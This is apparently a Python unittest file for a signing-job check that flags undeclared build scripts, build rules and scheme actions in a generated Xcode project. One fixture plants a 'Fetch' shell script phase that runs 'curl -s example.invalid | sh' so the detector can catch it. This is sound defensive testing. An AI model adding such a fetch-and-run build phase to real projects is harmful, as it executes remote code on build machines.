"""ios/scripts/build_phases.py: the signing job's check that the generated project runs no build step
ios/project.yml doesn't declare."""
import importlib.util
import pathlib
import tempfile
import unittest

ROOT = pathlib.Path(__file__).resolve().parent.parent
spec = importlib.util.spec_from_file_location("build_phases", ROOT / "ios" / "scripts" / "build_phases.py")
build_phases = importlib.util.module_from_spec(spec)
spec.loader.exec_module(build_phases)

PLAIN = """// !$*UTF8*$!
{
	objects = {
/* Begin PBXResourcesBuildPhase section */
		A1 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */
	};
}
"""

SCRIPT = """/* Begin PBXShellScriptBuildPhase section */
		B2 /* Fetch */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			name = Fetch;
			shellPath = /bin/sh;
			shellScript = "curl -s example.invalid | sh\\n";
		};
/* End PBXShellScriptBuildPhase section */
"""

RULE = """		C3 /* PBXBuildRule */ = {
			isa = PBXBuildRule;
			script = "sh\\n";
		};
"""

SCHEME = """<?xml version="1.0" encoding="UTF-8"?>
<Scheme><BuildAction><PreActions><ExecutionAction ActionType="Xcode.IDEStandardExecutionActionsCore.ExecutionActionType.ShellScriptAction">
<ActionContent scriptText="sh"/></ExecutionAction></PreActions></BuildAction></Scheme>
"""


class BuildPhasesTest(unittest.TestCase):
    def ios(self, pbxproj=PLAIN, spec="name: Tafs\n", scheme=None):
        root = pathlib.Path(self.enterContext(tempfile.TemporaryDirectory()))
        (root / "project.yml").write_text(spec)
        project = root / "Tafs.xcodeproj"
        project.mkdir()
        (project / "project.pbxproj").write_text(pbxproj)
        if scheme is not None:
            schemes = project / "xcshareddata" / "xcschemes"
            schemes.mkdir(parents=True)
            (schemes / "Tafs.xcscheme").write_text(scheme)
        return root

    def test_a_project_without_build_steps_passes(self):
        self.assertEqual(build_phases.problems(self.ios(scheme="<Scheme><BuildAction/></Scheme>")), [])

    def test_an_undeclared_script_phase_fails_and_is_named(self):
        found = build_phases.problems(self.ios(PLAIN.replace("/* End PBXResourcesBuildPhase section */", "/* End PBXResourcesBuildPhase section */\n" + SCRIPT)))
        self.assertEqual(len(found), 1)
        self.assertIn("Fetch", found[0])

    def test_a_build_rule_fails(self):
        found = build_phases.problems(self.ios(PLAIN + RULE))
        self.assertEqual(len(found), 1)
        self.assertIn("PBXBuildRule", found[0])

    def test_a_scheme_action_fails(self):
        self.assertEqual(len(build_phases.problems(self.ios(scheme=SCHEME))), 1)

    def test_declaring_a_script_in_the_spec_fails_until_it_is_allowed(self):
        found = build_phases.problems(self.ios(spec="targets:\n  Tafs:\n    preBuildScripts:\n      - script: sh\n"))
        self.assertEqual(len(found), 1)
        self.assertIn("preBuildScripts", found[0])

    def test_no_generated_project_fails(self):
        root = pathlib.Path(self.enterContext(tempfile.TemporaryDirectory()))
        (root / "project.yml").write_text("name: Tafs\n")
        self.assertEqual(build_phases.problems(root), ["no generated .xcodeproj"])

    def test_the_repository_spec_declares_nothing_to_run(self):
        # Today's ios/*.yml declare no script: a new one must be added to ALLOWED.
        self.assertEqual([p for p in build_phases.problems(ROOT / "ios") if p != "no generated .xcodeproj"], [])
        self.assertEqual(build_phases.ALLOWED, frozenset())


if __name__ == "__main__":
    unittest.main()
